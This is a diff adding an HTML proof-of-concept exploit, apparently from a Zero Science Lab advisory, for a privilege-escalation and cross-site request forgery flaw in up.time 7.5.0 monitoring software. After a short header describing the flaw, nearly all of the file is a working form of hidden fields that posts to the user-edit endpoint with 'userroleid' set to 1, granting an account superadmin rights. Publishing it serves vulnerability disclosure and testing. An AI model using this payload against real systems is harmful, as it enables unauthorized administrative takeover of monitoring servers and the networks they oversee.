@@ -1,0 +1,72 @@
+﻿<!--
+up.time 7.5.0 Superadmin Privilege Escalation Exploit
+
+
+Vendor: Idera Inc.
+Product web page: http://www.uptimesoftware.com
+Affected version: 7.5.0 (build 16) and 7.4.0 (build 13)
+
+Summary: The next-generation of IT monitoring software.
+
+Desc: up.time suffers from a privilege escalation issue.
+Normal user can elevate his/her privileges by sending
+a POST request seting the parameter 'userroleid' to 1.
+Attacker can exploit this issue using also cross-site
+request forgery attacks.
+
+Tested on: Jetty, PHP/5.4.34, MySQL
+           Apache/2.2.29 (Win64) mod_ssl/2.2.29 OpenSSL/1.0.1j PHP/5.4.34
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5251
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5251.php
+
+
+29.07.2015
+
+--
+-->
+
+<html>
+  <body>
+    <form action="http://127.0.0.1:9999/main.php?section=UserContainer&subsection=edit&id=4" method="POST">
+      <input type="hidden" name="operation" value="submit" />
+      <input type="hidden" name="disableEditOfUsernameRoleGroup" value="false" />
+      <input type="hidden" name="username" value="Testingus2" />
+      <input type="hidden" name="password" value="&#42;&#42;&#42;&#42;&#42;" />
+      <input type="hidden" name="passwordConfirm" value="&#42;&#42;&#42;&#42;&#42;" />
+      <input type="hidden" name="firstname" value="Test" />
+      <input type="hidden" name="lastname" value="Ingus" />
+      <input type="hidden" name="location" value="Neverland" />
+      <input type="hidden" name="emailaddress" value="test2&#64;test&#46;test" />
+      <input type="hidden" name="emailtimeperiodid" value="1" />
+      <input type="hidden" name="phonenumber" value="111111" />
+      <input type="hidden" name="phonenumbertimeperiodid" value="1" />
+      <input type="hidden" name="windowshost" value="test" />
+      <input type="hidden" name="windowsworkgroup" value="testgroup" />
+      <input type="hidden" name="windowspopuptimeperiodid" value="1" />
+      <input type="hidden" name="landingpage" value="MyPortal" />
+      <input type="hidden" name="isonvacation" value="0" />
+      <input type="hidden" name="receivealerts" value="on" />
+      <input type="hidden" name="receivealerts" value="1" />
+      <input type="hidden" name="alertoncritical" value="on" />
+      <input type="hidden" name="alertoncritical" value="1" />
+      <input type="hidden" name="alertonwarning" value="on" />
+      <input type="hidden" name="alertonwarning" value="1" />
+      <input type="hidden" name="alertonunknown" value="on" />
+      <input type="hidden" name="alertonunknown" value="1" />
+      <input type="hidden" name="alertonrecovery" value="on" />
+      <input type="hidden" name="alertonrecovery" value="1" />
+      <input type="hidden" name="activexgraphs" value="0" />
+      <input type="hidden" name="newuser" value="on" />
+      <input type="hidden" name="newuser" value="1" />
+      <input type="hidden" name="userroleid" value="1" />
+      <input type="hidden" name="usergroupid&#91;&#93;" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
